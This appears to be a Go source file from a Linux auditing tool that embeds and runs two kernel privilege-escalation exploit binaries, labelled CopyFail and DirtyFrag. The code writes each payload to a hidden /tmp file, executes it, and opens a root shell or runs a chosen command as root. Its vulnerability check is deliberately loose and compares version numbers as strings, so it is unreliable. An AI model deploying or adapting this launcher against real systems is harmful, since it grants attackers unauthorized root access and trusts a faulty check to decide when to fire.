//go:build linux

package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

//go:embed payloads/copyfail-linux-amd64
var copyfailAmd64 []byte

//go:embed payloads/copyfail-linux-arm64
var copyfailArm64 []byte

//go:embed payloads/dirtyfrag-linux-amd64
var dirtyfragAmd64 []byte

//go:embed payloads/dirtyfrag-linux-arm64
var dirtyfragArm64 []byte

// CheckKernelVulnCopyFail returns true if the running kernel is in the
// CVE-2026-31431 (CopyFail) window: v4.14 → April 2026 patch.
func CheckKernelVulnCopyFail(r *Report) bool {
	kernel := r.Host.Kernel // e.g. "5.15.153.1-microsoft-standard-WSL2"
	if kernel == "" {
		return false
	}
	// Check if the fix commit is present via /proc/version or kallsyms heuristic.
	// Simpler: flag as potentially vulnerable and let the exploit confirm.
	// The fix landed post April 2026; anything before that is suspect.
	// We check the kernel version number as a rough filter.
	parts := strings.SplitN(kernel, ".", 3)
	if len(parts) < 2 {
		return false
	}
	// Kernels 4.14–6.x before the fix are vulnerable.
	// We conservatively flag 4.14+ as potentially vulnerable unless we can
	// confirm the backport — the exploit itself will error cleanly if patched.
	major := parts[0]
	minor := parts[1]
	if major == "4" && minor < "14" {
		return false
	}
	if major < "4" {
		return false
	}
	return true
}

// CheckKernelVulnDirtyFrag returns true if kernel is in CVE-2026-43284 window
// (v4.14 → April 2026, before the algif_aead scatterlist fix).
func CheckKernelVulnDirtyFrag(r *Report) bool {
	// Same version window as CopyFail — both affect kernels shipped since 2017.
	return CheckKernelVulnCopyFail(r)
}

// TryDirtyFrag extracts and runs the DirtyFrag LPE (CVE-2026-43284).
func TryDirtyFrag(r *Report, execCmd string) {
	if os.Geteuid() == 0 {
		fmt.Fprintln(logWriter, "[escalate] Déjà root.")
		return
	}
	if !CheckKernelVulnDirtyFrag(r) {
		r.Add(Info, "LPE", "Noyau potentiellement patché (DirtyFrag)",
			"Version hors fenêtre CVE-2026-43284.", r.Host.Kernel)
		return
	}

	r.Add(High, "LPE", "Noyau potentiellement vulnérable à DirtyFrag (CVE-2026-43284)",
		"Escalade possible via ESP/RxRPC page-cache write primitive.",
		r.Host.Kernel)

	var payload []byte
	switch runtime.GOARCH {
	case "amd64":
		payload = dirtyfragAmd64
	case "arm64":
		payload = dirtyfragArm64
	default:
		fmt.Fprintf(logWriter, "[escalate] Architecture non supportée : %s\n", runtime.GOARCH)
		return
	}

	tmp := "/tmp/.dirtyfrag"
	if err := os.WriteFile(tmp, payload, 0700); err != nil {
		fmt.Fprintf(logWriter, "[escalate] Écriture payload échouée : %v\n", err)
		return
	}
	defer os.Remove(tmp)

	fmt.Fprintln(logWriter, "[escalate] Lancement de DirtyFrag (CVE-2026-43284)...")
	var cmd *exec.Cmd
	if execCmd != "" {
		// Re-run a specific binary as root via DirtyFrag
		// DirtyFrag drops a root shell — we wrap it with sh -c
		cmd = exec.Command("/bin/sh", "-c", tmp+" && "+execCmd)
	} else {
		cmd = exec.Command(tmp)
	}
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(logWriter, "[escalate] DirtyFrag échoué : %v\n", err)
		r.Add(Info, "LPE", "DirtyFrag : échec de l'escalade", err.Error())
	}
}

// TryEscalate embeds, extracts, and runs the copyfail LPE binary.
// If successful, re-executes the given command as root.
// The caller is responsible for cleaning up /tmp/.copyfail after use.
func TryEscalate(r *Report, execCmd string) {
	if os.Geteuid() == 0 {
		fmt.Fprintln(logWriter, "[escalate] Déjà root.")
		return
	}
	if !CheckKernelVulnCopyFail(r) {
		r.Add(Info, "LPE", "Noyau potentiellement patché (CopyFail)",
			"Version hors fenêtre CVE-2026-31431 ou déjà patché.", r.Host.Kernel)
		return
	}

	r.Add(High, "LPE", "Noyau potentiellement vulnérable à CopyFail (CVE-2026-31431)",
		"Fenêtre de vulnérabilité détectée. Escalade possible via AF_ALG/AEAD.",
		r.Host.Kernel)

	var payload []byte
	switch runtime.GOARCH {
	case "amd64":
		payload = copyfailAmd64
	case "arm64":
		payload = copyfailArm64
	default:
		fmt.Fprintf(logWriter, "[escalate] Architecture non supportée : %s\n", runtime.GOARCH)
		return
	}

	tmp := "/tmp/.copyfail"
	if err := os.WriteFile(tmp, payload, 0700); err != nil {
		fmt.Fprintf(logWriter, "[escalate] Impossible d'écrire le payload : %v\n", err)
		return
	}
	defer os.Remove(tmp)

	fmt.Fprintln(logWriter, "[escalate] Lancement de CopyFail (CVE-2026-31431)...")

	var cmd *exec.Cmd
	if execCmd != "" {
		// Re-run flashaudit itself (or any binary) as root
		cmd = exec.Command(tmp, "--backup", "/tmp/.su_bak", "--exec", execCmd)
	} else {
		// Drop to interactive root shell
		cmd = exec.Command(tmp, "--backup", "/tmp/.su_bak")
	}
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(logWriter, "[escalate] CopyFail échoué : %v\n", err)
		r.Add(Info, "LPE", "CopyFail : échec de l'escalade", err.Error())
	}
}
